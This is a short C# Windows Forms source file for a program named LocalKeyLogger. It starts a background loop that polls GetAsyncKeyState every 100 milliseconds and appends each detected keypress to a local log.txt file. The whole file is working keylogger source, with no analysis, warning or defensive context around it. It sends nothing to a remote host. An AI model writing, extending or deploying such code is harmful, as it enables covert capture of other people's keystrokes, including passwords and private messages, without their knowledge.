using System.Runtime.InteropServices;

namespace LocalKeyLogger
{
    

    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public Form1()
        {
            InitializeComponent();
            
            Task.Run(() => Listen());
        }

        void Listen()
        {
            string filename = "log.txt";

            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767 || keyState == 32769)
                    {
                        char x = (char)i;

                        File.AppendAllText(filename, x.ToString());

                        break;
                    }
                }
            }
        }
    }
}
